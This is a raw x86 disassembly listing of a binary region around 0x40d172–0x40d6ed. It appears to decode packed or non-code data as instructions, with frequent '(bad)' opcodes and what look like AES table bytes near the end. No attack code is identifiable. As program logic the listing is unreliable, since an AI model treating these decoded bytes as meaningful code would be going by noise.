  40d172:	07                   	pop    %es
  40d173:	4b                   	dec    %ebx
  40d174:	81 bd 25 d3 98 ce 03 	cmpl   $0x1b03903,-0x31672cdb(%ebp)
  40d17b:	39 b0 01 
  40d17e:	32 92 25 44 d8 90    	xor    -0x6f27bbdb(%edx),%dl
  40d184:	9f                   	lahf
  40d185:	0e                   	push   %cs
  40d186:	09 74 11 61          	or     %esi,0x61(%ecx,%edx,1)
  40d18a:	3e 15 92 c1 1f 56    	ds adc $0x561fc192,%eax
  40d190:	ec                   	in     (%dx),%al
  40d191:	8a 74 08 72          	mov    0x72(%eax,%ecx,1),%dh
  40d195:	60                   	pusha
  40d196:	0b 91 79 ec 41 6f    	or     0x6f41ec79(%ecx),%edx
  40d19c:	34 e1                	xor    $0xe1,%al
  40d19e:	76 2f                	jbe    0x40d1cf
  40d1a0:	17                   	pop    %ss
  40d1a1:	15 08 7d 20 ec       	adc    $0xec207d08,%eax
  40d1a6:	74 1b                	je     0x40d1c3
  40d1a8:	fc                   	cld
  40d1a9:	82 6c b7 ac 2d       	subb   $0x2d,-0x54(%edi,%esi,4)
  40d1ae:	79 89                	jns    0x40d139
  40d1b0:	08 7c e0 b6          	or     %bh,-0x4a(%eax,%eiz,8)
  40d1b4:	90                   	nop
  40d1b5:	03 e1                	add    %ecx,%esp
  40d1b7:	22 73 15             	and    0x15(%ebx),%dh
  40d1ba:	51                   	push   %ecx
  40d1bb:	b2 64                	mov    $0x64,%dl
  40d1bd:	31 10                	xor    %edx,(%eax)
  40d1bf:	19 19                	sbb    %ebx,(%ecx)
  40d1c1:	ca 84 d9             	lret   $0xd984
  40d1c4:	15 42 3a 0c b0       	adc    $0xb00c3a42,%eax
  40d1c9:	3a 8c 41 de 82 bb 27 	cmp    0x27bb82de(%ecx,%eax,2),%cl
  40d1d0:	2f                   	das
  40d1d1:	b2 42                	mov    $0x42,%dl
  40d1d3:	4a                   	dec    %edx
  40d1d4:	0e                   	push   %cs
  40d1d5:	1a 9c 56 0b 39 b0 0b 	sbb    0xbb0390b(%esi,%edx,2),%bl
  40d1dc:	52                   	push   %edx
  40d1dd:	b8 45 3c 2c 61       	mov    $0x612c3c45,%eax
  40d1e2:	18 50 1d             	sbb    %dl,0x1d(%eax)
  40d1e5:	99                   	cltd
  40d1e6:	10 1b                	adc    %bl,(%ebx)
  40d1e8:	02 f9                	add    %cl,%bh
  40d1ea:	2c 94                	sub    $0x94,%al
  40d1ec:	00 08                	add    %cl,(%eax)
  40d1ee:	7d 00                	jge    0x40d1f0
  40d1f0:	00 ff                	add    %bh,%bh
  40d1f2:	8b a2 00 fe 96 c1    	mov    -0x3e690200(%edx),%esp
  40d1f8:	7e 05                	jle    0x40d1ff
  40d1fa:	70 d1                	jo     0x40d1cd
  40d1fc:	11 fd                	adc    %edi,%ebp
  40d1fe:	ff                   	(bad)
  40d1ff:	ff                   	(bad)
  40d200:	ff ad 90 00 c0 4f    	ljmp   *0x4fc00090(%ebp)
  40d206:	d8 fd                	fdivr  %st(5),%st
  40d208:	ff 81 a6 12 dc 7f    	incl   0x7fdc12a6(%ecx)
  40d20e:	73 cf                	jae    0x40d1df
  40d210:	11 88 4d 00 aa 00    	adc    %ecx,0xaa004d(%eax)
  40d216:	4b                   	dec    %ebx
  40d217:	2e 24 9a             	cs and $0x9a,%al
  40d21a:	3c 35                	cmp    $0x35,%al
  40d21c:	49                   	dec    %ecx
  40d21d:	6b 51 fe 90          	imul   $0xffffff90,-0x2(%ecx),%edx
  40d221:	bc b9 1f ae a6       	mov    $0xa6ae1fb9,%esp
  40d226:	b6 88                	mov    $0x88,%dh
  40d228:	20 80 99 dc 56 95    	and    %al,-0x6aa92367(%eax)
  40d22e:	8c 82 7e c8 de dc    	mov    %es,-0x23213782(%edx)
  40d234:	0f a3 7e 32          	bt     %edi,0x32(%esi)
  40d238:	40                   	inc    %eax
  40d239:	c7 87 1f 01 78 85 7c 	movl   $0x9684817c,-0x7a87fee1(%edi)
  40d240:	81 84 96 
  40d243:	7f c0                	jg     0x40d205
  40d245:	2f                   	das
  40d246:	e1 47                	loope  0x40d28f
  40d248:	79 02                	jns    0x40d24c
  40d24a:	31 d7                	xor    %edx,%edi
  40d24c:	ce                   	into
  40d24d:	57                   	push   %edi
  40d24e:	57                   	push   %edi
  40d24f:	76 f6                	jbe    0x40d247
  40d251:	bf 55 4f a6 ac       	mov    $0xaca64f55,%edi
  40d256:	44                   	inc    %esp
  40d257:	fc                   	cld
  40d258:	e8 d0 11 a0 7c       	call   0x7ce0e42d
  40d25d:	5f                   	pop    %edi
  40d25e:	74 0f                	je     0x40d26f
  40d260:	ff a4 fb 43 8c ba fa 	jmp    *-0x54573bd(%ebx,%edi,8)
  40d267:	1c 23                	sbb    $0x23,%al
  40d269:	15 9f 79 04 9d       	adc    $0x9d04799f,%eax
  40d26e:	73 31                	jae    0x40d2a1
  40d270:	71 34                	jno    0x40d2a6
  40d272:	4f                   	dec    %edi
  40d273:	96                   	xchg   %eax,%esi
  40d274:	ff                   	(bad)
  40d275:	ff f4                	push   %esp
  40d277:	4c                   	dec    %esp
  40d278:	9a 7c 57 a4 4a e7 19 	lcall  $0x19e7,$0x4aa4577c
  40d27f:	56                   	push   %esi
  40d280:	bc e1 87 eb 33       	mov    $0x33eb87e1,%esp
  40d285:	32 d2                	xor    %dl,%dl
  40d287:	c9                   	leave
  40d288:	c7                   	(bad)
  40d289:	32 ff                	xor    %bh,%bh
  40d28b:	ff                   	(bad)
  40d28c:	ff f6                	push   %esi
  40d28e:	9e                   	sahf
  40d28f:	c4 8b bc 0f 85 d4    	les    -0x2b7af044(%ebx),%ecx
  40d295:	00 10                	add    %dl,(%eax)
  40d297:	5a                   	pop    %edx
  40d298:	1f                   	pop    %ds
  40d299:	83 04 c5 de 59 a3 13 	addl   $0xffffffe8,0x13a359de(,%eax,8)
  40d2a0:	e8 
  40d2a1:	34 48                	xor    $0x48,%al
  40d2a3:	8a 2a                	mov    (%edx),%ch
  40d2a5:	ba 7f 1d 77 7d       	mov    $0x7d771d7f,%edx
  40d2aa:	cf                   	iret
  40d2ab:	ed                   	in     (%dx),%eax
  40d2ac:	0f d9 76 99          	psubusw -0x67(%esi),%mm6
  40d2b0:	cf                   	iret
  40d2b1:	88 c2                	mov    %al,%dl
  40d2b3:	05 27 ae 79 2f       	add    $0x2f79ae27,%eax
  40d2b8:	b3 48                	mov    $0x48,%bl
  40d2ba:	81 d9 ed 0f d9 77    	sbb    $0x77d90fed,%ecx
  40d2c0:	92                   	xchg   %eax,%edx
  40d2c1:	1f                   	pop    %ds
  40d2c2:	11 f8                	adc    %edi,%eax
  40d2c4:	90                   	nop
  40d2c5:	45                   	inc    %ebp
  40d2c6:	3a 1d 8f 89 1f bf    	cmp    0xbf1f898f,%bl
  40d2cc:	b0 9f                	mov    $0x9f,%al
  40d2ce:	6c                   	insb   (%dx),%es:(%edi)
  40d2cf:	ff 98 66 4b 67 92    	lcall  *-0x6d98b49a(%eax)
  40d2d5:	ee                   	out    %al,(%dx)
  40d2d6:	d0 8f 71 28 20 bd    	rorb   $1,-0x42dfd78f(%edi)
  40d2dc:	49                   	dec    %ecx
  40d2dd:	9f                   	lahf
  40d2de:	ff 97 db 3f 86 30    	call   *0x30863fdb(%edi)
  40d2e4:	65 9a 4f 17 4f b5 f9 	gs lcall $0x4bf9,$0xb54f174f
  40d2eb:	4b 
  40d2ec:	70 3e                	jo     0x40d32c
  40d2ee:	fd                   	std
  40d2ef:	57                   	push   %edi
  40d2f0:	97                   	xchg   %eax,%edi
  40d2f1:	af                   	scas   %es:(%edi),%eax
  40d2f2:	6d                   	insl   (%dx),%es:(%edi)
  40d2f3:	37                   	aaa
  40d2f4:	2e 90                	cs nop
  40d2f6:	0c d9                	or     $0xd9,%al
  40d2f8:	65 9f                	gs lahf
  40d2fa:	bd af c6 ff 3f       	mov    $0x3fffc6af,%ebp
  40d2ff:	e9 fe f2 66 15       	jmp    0x15a7c602
  40d304:	c7                   	(bad)
  40d305:	1e                   	push   %ds
  40d306:	56                   	push   %esi
  40d307:	4f                   	dec    %edi
  40d308:	87 9d 55 1c 8d f0    	xchg   %ebx,-0xf72e3ab(%ebp)
  40d30e:	84 b3 4b a7 d5 56    	test   %dh,0x56d5a74b(%ebx)
  40d314:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d315:	ee                   	out    %al,(%dx)
  40d316:	ff                   	(bad)
  40d317:	fd                   	std
  40d318:	ff 43 5a             	incl   0x5a(%ebx)
  40d31b:	9b                   	fwait
  40d31c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d31d:	f9                   	stc
  40d31e:	1d b3 b7 15 d5       	sbb    $0xd515b7b3,%eax
  40d323:	d3 11                	rcll   %cl,(%ecx)
  40d325:	a1 1c 2f 51 5a       	mov    0x5a512f1c,%eax
  40d32a:	3a 88 bf bf d7 ca    	cmp    -0x35284041(%eax),%cl
  40d330:	0f bb 1f             	btc    %ebx,(%edi)
  40d333:	b2 93                	mov    $0x93,%dl
  40d335:	1b 4e 6f             	sbb    0x6f(%esi),%ecx
  40d338:	53                   	push   %ebx
  40d339:	00 45 00             	add    %al,0x0(%ebp)
  40d33c:	4c                   	dec    %esp
  40d33d:	03 43 00             	add    0x0(%ebx),%eax
  40d340:	84 bb bf f9 54 00    	test   %bh,0x54f9bf(%ebx)
  40d346:	20 00                	and    %al,(%eax)
  40d348:	2a 46 00             	sub    0x0(%esi),%al
  40d34b:	52                   	push   %edx
  40d34c:	00 4f 00             	add    %cl,0x0(%edi)
  40d34f:	4d                   	dec    %ebp
  40d350:	09 25 00 73 84 75    	or     %esp,0x75847300
  40d356:	63 dd                	arpl   %ebx,%ebp
  40d358:	42                   	inc    %edx
  40d359:	8a 51 23             	mov    0x23(%ecx),%dl
  40d35c:	00 17                	add    %dl,(%edi)
  40d35e:	4f                   	dec    %edi
  40d35f:	27                   	daa
  40d360:	5c                   	pop    %esp
  40d361:	ff b1 42 d7 2d 49    	push   0x492dd742(%ecx)
  40d367:	21 56 d0             	and    %edx,-0x30(%esi)
  40d36a:	1f                   	pop    %ds
  40d36b:	1f                   	pop    %ds
  40d36c:	04 3e                	add    $0x3e,%al
  40d36e:	04 34                	add    $0x34,%al
  40d370:	04 41                	add    $0x41,%al
  40d372:	04 6d                	add    $0x6d,%al
  40d374:	ee                   	out    %al,(%dx)
  40d375:	7b ff                	jnp    0x40d376
  40d377:	47                   	inc    %edi
  40d378:	04 35                	add    $0x35,%al
  40d37a:	04 42                	add    $0x42,%al
  40d37c:	04 2e                	add    $0x2e,%al
  40d37e:	00 01                	add    %al,(%ecx)
  40d380:	00 18                	add    %bl,(%eax)
  40d382:	15 11 3d f9 cd       	adc    $0xcdf93d11,%eax
  40d387:	dd dd                	fstp   %st(5)
  40d389:	13 38                	adc    (%eax),%edi
  40d38b:	04 44                	add    $0x44,%al
  40d38d:	03 3a                	add    (%edx),%edi
  40d38f:	04 30                	add    $0x30,%al
  40d391:	0b 2b                	or     (%ebx),%ebp
  40d393:	40                   	inc    %eax
  40d394:	04 20                	add    $0x20,%al
  40d396:	00 36                	add    %dh,(%esi)
  40d398:	76 f7                	jbe    0x40d391
  40d39a:	b9 ae 3b 03 37       	mov    $0x37033bae,%ecx
  40d39f:	13 2b                	adc    (%ebx),%ebp
  40d3a1:	48                   	dec    %eax
  40d3a2:	51                   	push   %ecx
  40d3a3:	44                   	inc    %esp
  40d3a4:	00 3a                	add    %bh,(%edx)
  40d3a6:	75 bf                	jne    0x40d367
  40d3a8:	b9 7f 4b 61 61       	mov    $0x61614b7f,%ecx
  40d3ad:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40d3b1:	00 75 05             	add    %dh,0x5(%ebp)
  40d3b4:	09 74 00 69          	or     %esi,0x69(%eax,%eax,1)
  40d3b8:	00 6e ee             	add    %ch,-0x12(%esi)
  40d3bb:	ae                   	scas   %es:(%edi),%al
  40d3bc:	bb ec 00 67 00       	mov    $0x6700ec,%ebx
  40d3c1:	5b                   	pop    %ebx
  40d3c2:	43                   	inc    %ebx
  40d3c3:	11 74 19 64          	adc    %esi,0x64(%ecx,%ebx,1)
  40d3c7:	00 65 21             	add    %ah,0x21(%ebp)
  40d3ca:	dc 58 d7             	fcompl -0x29(%eax)
  40d3cd:	6d                   	insl   (%dx),%es:(%edi)
  40d3ce:	35 48 0b 72 0d       	xor    $0xd720b48,%eax
  40d3d3:	77 07                	ja     0x40d3dc
  40d3d5:	65 11 a5 62 0a fb 4f 	adc    %esp,%gs:0x4ffb0a62(%ebp)
  40d3dc:	00 17                	add    %dl,(%edi)
  40d3de:	02 73 ff             	add    -0x1(%ebx),%dh
  40d3e1:	bf 7d 63 01 10       	mov    $0x1001637d,%edi
  40d3e6:	4d                   	dec    %ebp
  40d3e7:	80 69 7c 77          	subb   $0x77,0x7c(%ecx)
  40d3eb:	7b f2                	jnp    0x40d3df
  40d3ed:	6b 6f c5 30          	imul   $0x30,-0x3b(%edi),%ebp
  40d3f1:	01 67 2b             	add    %esp,0x2b(%edi)
  40d3f4:	fe                   	(bad)
  40d3f5:	d7                   	xlat   %ds:(%ebx)
  40d3f6:	ff                   	(bad)
  40d3f7:	ff                   	(bad)
  40d3f8:	ff                   	(bad)
  40d3f9:	ff ab 76 ca 82 c9    	ljmp   *-0x367d358a(%ebx)
  40d3ff:	7d fa                	jge    0x40d3fb
  40d401:	59                   	pop    %ecx
  40d402:	47                   	inc    %edi
  40d403:	f0 ad                	lock lods %ds:(%esi),%eax
  40d405:	d4 a2                	aam    $0xa2
  40d407:	af                   	scas   %es:(%edi),%eax
  40d408:	9c                   	pushf
  40d409:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d40a:	72 c0                	jb     0x40d3cc
  40d40c:	b7 fd                	mov    $0xfd,%bh
  40d40e:	93                   	xchg   %eax,%ebx
  40d40f:	26 36 3f             	es ss aas
  40d412:	f7 cc 34 a5 e5 f1    	test   $0xf1e5a534,%esp
  40d418:	71 d8                	jno    0x40d3f2
  40d41a:	97                   	xchg   %eax,%edi
  40d41b:	a0 ff ff 31 15       	mov    0x1531ffff,%al
  40d420:	04 c7                	add    $0xc7,%al
  40d422:	23 c3                	and    %ebx,%eax
  40d424:	18 96 05 9a 07 12    	sbb    %dl,0x12079a05(%esi)
  40d42a:	80 e2 eb             	and    $0xeb,%dl
  40d42d:	27                   	daa
  40d42e:	b2 5e                	mov    $0x5e,%dl
  40d430:	2c 1a                	sub    $0x1a,%al
  40d432:	ff                   	(bad)
  40d433:	ff                   	(bad)
  40d434:	ff                   	(bad)
  40d435:	ff 1b                	lcall  *(%ebx)
  40d437:	6e                   	outsb  %ds:(%esi),(%dx)
  40d438:	5a                   	pop    %edx
  40d439:	a0 52 3b d6 b3       	mov    0xb3d63b52,%al
  40d43e:	29 e3                	sub    %esp,%ebx
  40d440:	2f                   	das
  40d441:	84 53 d1             	test   %dl,-0x2f(%ebx)
  40d444:	00 ed                	add    %ch,%ch
  40d446:	20 fc                	and    %bh,%ah
  40d448:	b1 5b                	mov    $0x5b,%cl
  40d44a:	6a cb                	push   $0xffffffcb
  40d44c:	be 39 4a 4c 58       	mov    $0x584c4a39,%esi
  40d451:	cf                   	iret
  40d452:	d0 ef                	shr    $1,%bh
  40d454:	aa                   	stos   %al,%es:(%edi)
  40d455:	fb                   	sti
  40d456:	ff                   	(bad)
  40d457:	ff                   	(bad)
  40d458:	ff                   	(bad)
  40d459:	ff 43 4d             	incl   0x4d(%ebx)
  40d45c:	33 85 45 f9 02 7f    	xor    0x7f02f945(%ebp),%eax
  40d462:	50                   	push   %eax
  40d463:	3c 9f                	cmp    $0x9f,%al
  40d465:	a8 51                	test   $0x51,%al
  40d467:	a3 40 8f 92 9d       	mov    %eax,0x9d928f40
  40d46c:	38 f5                	cmp    %dh,%ch
  40d46e:	bc b6 da 21 10       	mov    $0x1021dab6,%esp
  40d473:	ff f3                	push   %ebx
  40d475:	d2 cd                	ror    %cl,%ch
  40d477:	0c 13                	or     $0x13,%al
  40d479:	ec                   	in     (%dx),%al
  40d47a:	ff                   	(bad)
  40d47b:	ff                   	(bad)
  40d47c:	ff                   	(bad)
  40d47d:	ff 5f 97             	lcall  *-0x69(%edi)
  40d480:	44                   	inc    %esp
  40d481:	17                   	pop    %ss
  40d482:	c4 a7 7e 3d 64 5d    	les    0x5d643d7e(%edi),%esp
  40d488:	19 73 60             	sbb    %esi,0x60(%ebx)
  40d48b:	81 4f dc 22 2a 90 88 	orl    $0x88902a22,-0x24(%edi)
  40d492:	46                   	inc    %esi
  40d493:	ee                   	out    %al,(%dx)
  40d494:	b8 14 de 5e 0b       	mov    $0xb5ede14,%eax
  40d499:	db e0                	fneni(8087 only)
  40d49b:	32 3a                	xor    (%edx),%bh
  40d49d:	0a ff                	or     %bh,%bh
  40d49f:	ff                   	(bad)
  40d4a0:	ff                   	(bad)
  40d4a1:	ff 49 06             	decl   0x6(%ecx)
  40d4a4:	24 5c                	and    $0x5c,%al
  40d4a6:	c2 d3 ac             	ret    $0xacd3
  40d4a9:	62 91 95 e4 79 e7    	bound  %edx,-0x18861b6b(%ecx)
  40d4af:	c8 37 6d 8d          	enter  $0x6d37,$0x8d
  40d4b3:	d5 4e                	aad    $0x4e
  40d4b5:	a9 6c 56 f4 ea       	test   $0xeaf4566c,%eax
  40d4ba:	65 7a ae             	gs jp  0x40d46b
  40d4bd:	08 ba 78 25 2e ff    	or     %bh,-0xd1da88(%edx)
  40d4c3:	bf f1 ff 1c a6       	mov    $0xa61cfff1,%edi
  40d4c8:	b4 c6                	mov    $0xc6,%ah
  40d4ca:	e8 dd 74 1f 4b       	call   0x4b6049ac
  40d4cf:	bd 8b 8a 5a b5       	mov    $0xb55a8a8b,%ebp
  40d4d4:	66 48                	dec    %ax
  40d4d6:	03 f6                	add    %esi,%esi
  40d4d8:	0e                   	push   %cs
  40d4d9:	61                   	popa
  40d4da:	35 57 b9 86 c1       	xor    $0xc186b957,%eax
  40d4df:	1d ff ff ff ff       	sbb    $0xffffffff,%eax
  40d4e4:	9e                   	sahf
  40d4e5:	e1 f8                	loope  0x40d4df
  40d4e7:	98                   	cwtl
  40d4e8:	11 69 d9             	adc    %ebp,-0x27(%ecx)
  40d4eb:	8e 94 9b 1e 87 e9 ce 	mov    -0x311678e2(%ebx,%ebx,4),%ss
  40d4f2:	55                   	push   %ebp
  40d4f3:	28 df                	sub    %bl,%bh
  40d4f5:	8c a1 89 0d bf e6    	mov    %fs,-0x1940f277(%ecx)
  40d4fb:	42                   	inc    %edx
  40d4fc:	68 41 99 2d 0f       	push   $0xf2d9941
  40d501:	b0 54                	mov    $0x54,%al
  40d503:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  40d508:	16                   	push   %ss
  40d509:	52                   	push   %edx
  40d50a:	09 6a d5             	or     %ebp,-0x2b(%edx)
  40d50d:	30 36                	xor    %dh,(%esi)
  40d50f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d510:	38 bf 40 a3 9e 81    	cmp    %bh,-0x7e615cc0(%edi)
  40d516:	f3 d7                	repz xlat %ds:(%ebx)
  40d518:	fb                   	sti
  40d519:	7c e3                	jl     0x40d4fe
  40d51b:	39 82 9b 2f ff 87    	cmp    %eax,-0x7800d065(%edx)
  40d521:	34 8e                	xor    $0x8e,%al
  40d523:	43                   	inc    %ebx
  40d524:	44                   	inc    %esp
  40d525:	c4                   	(bad)
  40d526:	de e9                	fsubrp %st,%st(1)
  40d528:	ff                   	(bad)
  40d529:	ff                   	(bad)
  40d52a:	ff                   	(bad)
  40d52b:	ff cb                	dec    %ebx
  40d52d:	54                   	push   %esp
  40d52e:	7b 94                	jnp    0x40d4c4
  40d530:	32 a6 c2 23 3d ee    	xor    -0x11c2dc3e(%esi),%ah
  40d536:	4c                   	dec    %esp
  40d537:	95                   	xchg   %eax,%ebp
  40d538:	0b 42 fa             	or     -0x6(%edx),%eax
  40d53b:	c3                   	ret
  40d53c:	4e                   	dec    %esi
  40d53d:	08 2e                	or     %ch,(%esi)
  40d53f:	a1 66 28 d9 24       	mov    0x24d92866,%eax
  40d544:	b2 76                	mov    $0x76,%dl
  40d546:	5b                   	pop    %ebx
  40d547:	a2 49 6d 8b d1       	mov    %al,0xd18b6d49
  40d54c:	ff                   	(bad)
  40d54d:	ff                   	(bad)
  40d54e:	ff                   	(bad)
  40d54f:	ff 25 72 f8 f6 64    	jmp    *0x64f6f872
  40d555:	86 68 98             	xchg   %ch,-0x68(%eax)
  40d558:	16                   	push   %ss
  40d559:	d4 a4                	aam    $0xa4
  40d55b:	5c                   	pop    %esp
  40d55c:	cc                   	int3
  40d55d:	5d                   	pop    %ebp
  40d55e:	65 b6 92             	gs mov $0x92,%dh
  40d561:	6c                   	insb   (%dx),%es:(%edi)
  40d562:	70 48                	jo     0x40d5ac
  40d564:	50                   	push   %eax
  40d565:	fd                   	std
  40d566:	ed                   	in     (%dx),%eax
  40d567:	b9 da 5e 15 46       	mov    $0x46155eda,%ecx
  40d56c:	57                   	push   %edi
  40d56d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d56e:	8d 9d ff ff ff ff    	lea    -0x1(%ebp),%ebx
  40d574:	84 90 d8 ab 00 8c    	test   %dl,-0x73ff5428(%eax)
  40d57a:	bc d3 0a f7 e4       	mov    $0xe4f70ad3,%esp
  40d57f:	58                   	pop    %eax
  40d580:	05 b8 b3 45 06       	add    $0x645b3b8,%eax
  40d585:	d0 2c 1e             	shrb   $1,(%esi,%ebx,1)
  40d588:	8f ca 3f 0f          	(bad)
  40d58c:	02 c1                	add    %cl,%al
  40d58e:	af                   	scas   %es:(%edi),%eax
  40d58f:	bd 03 01 13 8a       	mov    $0x8a130103,%ebp
  40d594:	2f                   	das
  40d595:	c4                   	(bad)
  40d596:	ff                   	(bad)
  40d597:	ff 6b 3a             	ljmp   *0x3a(%ebx)
  40d59a:	91                   	xchg   %eax,%ecx
  40d59b:	11 41 4f             	adc    %eax,0x4f(%ecx)
  40d59e:	67 dc ea             	addr16 fsubr %st,%st(2)
  40d5a1:	97                   	xchg   %eax,%edi
  40d5a2:	f2 cf                	repnz iret
  40d5a4:	ce                   	into
  40d5a5:	f0 b4 e6             	lock mov $0xe6,%ah
  40d5a8:	73 96                	jae    0x40d540
  40d5aa:	4f                   	dec    %edi
  40d5ab:	e7 ad                	out    %eax,$0xad
  40d5ad:	35 ff ff ff ff       	xor    $0xffffffff,%eax
  40d5b2:	85 e2                	test   %esp,%edx
  40d5b4:	f9                   	stc
  40d5b5:	37                   	aaa
  40d5b6:	e8 1c 75 df 6e       	call   0x6f204ad7
  40d5bb:	47                   	inc    %edi
  40d5bc:	f1                   	int1
  40d5bd:	1a 71 1d             	sbb    0x1d(%ecx),%dh
  40d5c0:	29 c5                	sub    %eax,%ebp
  40d5c2:	89 6f b7             	mov    %ebp,-0x49(%edi)
  40d5c5:	62 0e                	bound  %ecx,(%esi)
  40d5c7:	aa                   	stos   %al,%es:(%edi)
  40d5c8:	18 be 1b fc 56 3e    	sbb    %bh,0x3e56fc1b(%esi)
  40d5ce:	4b                   	dec    %ebx
  40d5cf:	c6                   	(bad)
  40d5d0:	d2 79 17             	sarb   %cl,0x17(%ecx)
  40d5d3:	fe                   	(bad)
  40d5d4:	ff                   	(bad)
  40d5d5:	ff 20                	jmp    *(%eax)
  40d5d7:	9a db c0 fe 78 cd 5a 	lcall  $0x5acd,$0x78fec0db
  40d5de:	f4                   	hlt
  40d5df:	1f                   	pop    %ds
  40d5e0:	dd a8 33 88 07 c7    	(bad) -0x38f877cd(%eax)
  40d5e6:	31 b1 12 10 59 27    	xor    %esi,0x27591012(%ecx)
  40d5ec:	80 4a 60 51          	orb    $0x51,0x60(%edx)
  40d5f0:	ff                   	(bad)
  40d5f1:	ff                   	(bad)
  40d5f2:	ff                   	(bad)
  40d5f3:	ff                   	(bad)
  40d5f4:	7f a9                	jg     0x40d59f
  40d5f6:	19 b5 4a 0d 2d e5    	sbb    %esi,-0x1ad2f2b6(%ebp)
  40d5fc:	7a 9f                	jp     0x40d59d
  40d5fe:	93                   	xchg   %eax,%ebx
  40d5ff:	c9                   	leave
  40d600:	9c                   	pushf
  40d601:	ef                   	out    %eax,(%dx)
  40d602:	a0 e0 3b 4d ae       	mov    0xae4d3be0,%al
  40d607:	2a f5                	sub    %ch,%dh
  40d609:	b0 c8                	mov    $0xc8,%al
  40d60b:	eb bb                	jmp    0x40d5c8
  40d60d:	3c 83                	cmp    $0x83,%al
  40d60f:	53                   	push   %ebx
  40d610:	99                   	cltd
  40d611:	61                   	popa
  40d612:	17                   	pop    %ss
  40d613:	2b ff                	sub    %edi,%edi
  40d615:	ff                   	(bad)
  40d616:	ff                   	(bad)
  40d617:	ff 04 7e             	incl   (%esi,%edi,2)
  40d61a:	ba 77 d6 26 e1       	mov    $0xe126d677,%edx
  40d61f:	69 14 63 55 21 0c 7d 	imul   $0x7d0c2155,(%ebx,%eiz,2),%edx
  40d626:	c6                   	(bad)
  40d627:	63 63 a5             	arpl   %esp,-0x5b(%ebx)
  40d62a:	f8                   	clc
  40d62b:	7c 7c                	jl     0x40d6a9
  40d62d:	84 ee                	test   %ch,%dh
  40d62f:	77 77                	ja     0x40d6a8
  40d631:	99                   	cltd
  40d632:	f6 7b 7b             	idivb  0x7b(%ebx)
  40d635:	8d                   	lea    (bad),%edi
  40d636:	ff f2                	push   %edx
  40d638:	ff c6                	inc    %esi
  40d63a:	ff                   	(bad)
  40d63b:	ff f2                	push   %edx
  40d63d:	0d d6 6b 6b bd       	or     $0xbd6b6bd6,%eax
  40d642:	de 6f 6f             	fisubrs 0x6f(%edi)
  40d645:	b1 91                	mov    $0x91,%cl
  40d647:	c5 c5 54 60 30       	vandpd 0x30(%eax),%ymm7,%ymm4
  40d64c:	30 50 33             	xor    %dl,0x33(%eax)
  40d64f:	01 03                	add    %eax,(%ebx)
  40d651:	ce                   	into
  40d652:	67 67 a9 56 bf fd bf 	addr16 addr16 test $0xbffdbf56,%eax
  40d659:	fd                   	std
  40d65a:	2b 2b                	sub    (%ebx),%ebp
  40d65c:	7d e7                	jge    0x40d645
  40d65e:	fe                   	(bad)
  40d65f:	fe                   	(bad)
  40d660:	5e                   	pop    %esi
  40d661:	d7                   	xlat   %ds:(%ebx)
  40d662:	d7                   	xlat   %ds:(%ebx)
  40d663:	62 4d ab             	bound  %ecx,-0x55(%ebp)
  40d666:	ab                   	stos   %eax,%es:(%edi)
  40d667:	e6 ec                	out    %al,$0xec
  40d669:	76 76                	jbe    0x40d6e1
  40d66b:	9a cc ca 45 1f 82 82 	lcall  $0x8282,$0x1f45cacc
  40d672:	ff                   	(bad)
  40d673:	ff                   	(bad)
  40d674:	ff                   	(bad)
  40d675:	ff 9d 89 c9 c9 40    	lcall  *0x40c9c989(%ebp)
  40d67b:	fa                   	cli
  40d67c:	7d 7d                	jge    0x40d6fb
  40d67e:	87 ef                	xchg   %ebp,%edi
  40d680:	fa                   	cli
  40d681:	fa                   	cli
  40d682:	15 b2 59 59 eb       	adc    $0xeb5959b2,%eax
  40d687:	8e 47 47             	mov    0x47(%edi),%es
  40d68a:	c9                   	leave
  40d68b:	fb                   	sti
  40d68c:	f0 f0 0b 41 ad       	lock lock or -0x53(%ecx),%eax
  40d691:	ad                   	lods   %ds:(%esi),%eax
  40d692:	ec                   	in     (%dx),%al
  40d693:	b3 d4                	mov    $0xd4,%bl
  40d695:	d4 ff                	aam    $0xff
  40d697:	0b ff                	or     %edi,%edi
  40d699:	ff 67 5f             	jmp    *0x5f(%edi)
  40d69c:	a2 a2 fd 45 af       	mov    %al,0xaf45fda2
  40d6a1:	af                   	scas   %es:(%edi),%eax
  40d6a2:	ea 23 9c 9c bf 53 a4 	ljmp   $0xa453,$0xbf9c9c23
  40d6a9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d6aa:	0e                   	push   %cs
  40d6ab:	72 72                	jb     0x40d71f
  40d6ad:	96                   	xchg   %eax,%esi
  40d6ae:	9b                   	fwait
  40d6af:	c0 c0 5b             	rol    $0x5b,%al
  40d6b2:	75 b7                	jne    0x40d66b
  40d6b4:	ff                   	(bad)
  40d6b5:	ff                   	(bad)
  40d6b6:	ff                   	(bad)
  40d6b7:	ff b7 c2 e1 fd fd    	push   -0x2021e3e(%edi)
  40d6bd:	1c 3d                	sbb    $0x3d,%al
  40d6bf:	93                   	xchg   %eax,%ebx
  40d6c0:	93                   	xchg   %eax,%ebx
  40d6c1:	ae                   	scas   %es:(%edi),%al
  40d6c2:	4c                   	dec    %esp
  40d6c3:	26 26 6a 6c          	es es push $0x6c
  40d6c7:	36 36 5a             	ss ss pop %edx
  40d6ca:	7e 3f                	jle    0x40d70b
  40d6cc:	3f                   	aas
  40d6cd:	41                   	inc    %ecx
  40d6ce:	f5                   	cmc
  40d6cf:	f7 f7                	div    %edi
  40d6d1:	02 83 cc cc 4f 68    	add    0x684fcccc(%ebx),%al
  40d6d7:	34 ff                	xor    $0xff,%al
  40d6d9:	ff                   	(bad)
  40d6da:	ff                   	(bad)
  40d6db:	ff 34 5c             	push   (%esp,%ebx,2)
  40d6de:	51                   	push   %ecx
  40d6df:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d6e0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d6e1:	f4                   	hlt
  40d6e2:	d1 e5                	shl    $1,%ebp
  40d6e4:	e5 34                	in     $0x34,%eax
  40d6e6:	f9                   	stc
  40d6e7:	f1                   	int1
  40d6e8:	f1                   	int1
  40d6e9:	08 e2                	or     %ah,%dl
  40d6eb:	71 71                	jno    0x40d75e
  40d6ed:	93                   	xchg   %eax,%ebx
